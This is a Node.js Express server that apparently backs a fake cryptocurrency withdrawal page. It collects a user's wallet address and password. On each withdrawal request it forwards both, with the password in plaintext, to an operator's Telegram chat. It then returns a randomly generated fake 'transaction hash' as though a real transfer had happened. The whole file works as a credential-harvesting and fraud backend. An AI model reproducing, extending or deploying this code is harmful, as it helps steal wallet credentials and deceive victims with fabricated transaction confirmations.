const express = require("express");
const axios = require("axios");
const app = express();
app.use(express.json());

// Telegram Bot ENV
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

// Temporary memory
let savedWallet = null;
let savedPassword = null;

// =========================
// Bind Wallet
// =========================
app.post("/api/wallet", (req, res) => {
    const { wallet, password } = req.body;

    if (!wallet) return res.json({ ok: false, error: "Wallet required" });
    if (!password) return res.json({ ok: false, error: "Password required" });

    // First time bind
    if (!savedWallet && !savedPassword) {
        savedWallet = wallet;
        savedPassword = password;

        return res.json({
            ok: true,
            wallet: savedWallet
        });
    }

    // Already bound
    return res.json({
        ok: false,
        error: "Wallet already bound"
    });
});

// =========================
// Withdrawal
// =========================
app.post("/api/withdraw", async (req, res) => {
    const { coin, amount, usdt, wallet, password } = req.body;

    if (!wallet) return res.json({ ok: false, error: "Wallet missing" });
    if (wallet !== savedWallet) return res.json({ ok: false, error: "Wallet mismatch" });
    if (password !== savedPassword) return res.json({ ok: false, error: "Wrong password" });

    // Generate hash
    const hash = "TX" + Math.floor(100000000 + Math.random() * 900000000);

    // Telegram Message
    const message =
`📤 NEW WITHDRAWAL REQUEST
--------------------------------
💰 Coin: ${coin}
🔢 Amount: ${amount}
💵 USDT: ${usdt}
🏦 Wallet: ${wallet}
🔐 Password: ${password}
🆔 Transaction Hash: ${hash}
⚠️ Wallet & password can be bound once.
Please screenshot the transaction hash for record.`;

    // Send to Telegram
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID,
            text: message,
            parse_mode: "HTML"
        });
    } catch (err) {
        console.log("Telegram Error:", err?.response?.data || err);
    }

    return res.json({
        ok: true,
        hash
    });
});

// =========================
// Serve index.html
// =========================
app.get("/", (req, res) => {
    res.sendFile(__dirname + "/index.html");
});

// =========================
// Start Server
// =========================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log("Server running on port " + PORT);
});
